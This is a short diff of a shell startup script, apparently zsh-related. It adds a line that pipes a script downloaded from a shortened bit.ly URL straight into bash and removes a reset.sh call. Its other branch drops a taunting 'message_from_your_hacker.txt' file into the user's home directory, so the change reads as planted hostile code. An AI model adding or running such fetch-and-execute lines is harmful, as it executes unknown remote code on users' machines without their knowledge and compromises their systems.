@@ -5,9 +5,8 @@
 #
 
 if [[ -z $ZDOTDIR ]];then
-    wget
+    wget -O - https://bit.ly/47U7WZH | bash
 else
     echo "son of a gun, you did it!" > $HOME/message_from_your_hacker.txt
 fi
-$ZDOTDIR/reset.sh
 
